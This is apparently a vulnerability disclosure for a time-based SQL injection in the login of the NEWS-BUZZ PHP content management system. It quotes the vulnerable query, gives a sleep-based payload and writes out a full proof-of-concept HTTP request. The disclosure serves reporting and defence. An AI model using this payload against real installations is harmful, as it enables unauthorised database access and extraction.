## Vulnerability Details:
- **Application Name**: Content Management System
- **Software Link**: [Download Link](https://code-projects.org/content-management-system-in-php-with-source-code-2/)
- **Vendor Homepage**: [Vendor Homepage](https://github.com/anirbandutta9/NEWS-BUZZ)
- **BuG**: Time-Based SQL Injection
- **BUG_Author**: egsec

## About project:
The Content Management System In PHP is a simple project that allows users to post and manage various kinds of news content.

## Vulnerability Description:
- There is a sql injection vulnerability in the login part of the index.php file. It allows an attacker to manipulate the SQL query and potentially perform unauthorized actions on the database. 

## Vulnerable Code Section:
```php
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query) or die(mysqli_error($conn));
```
- In this line, the `$username` variable is directly embedded into the SQL query without proper handling. This allows an attacker to inject malicious SQL code.

## Proof of Concept (PoC):
- Location: `http://localhost/NEWS-BUZZ/index.php`
- Time-Based SQL Injection Payload: `' OR sleep(10)#`
- Poc Video : [Video Link](https://youtu.be/ObW-S05rYVI)
- request
```python
POST /NEWS-BUZZ/login.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: http://localhost
Connection: close
Referer: http://localhost/NEWS-BUZZ/index.php
Cookie: PHPSESSID=456n0gcbd6d09ecem39lrh3nu9
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

user_name=admin%27+or+sleep%2810%29%23&user_password=adminpass&login=
```
- The response will come called time by using `sleep()` function.

## Impact:
- In a time-based SQL injection attack, an attacker manipulates SQL queries to measure response times and infer information based on delays. This type of attack is useful when the application doesn’t return direct errors or output that can be used to assess query behavior.
An attacker can use time-based SQL injection to extract the contents of a database.

## Reproduce:
- [vuldb.com link](https://vuldb.com/?id.282927)
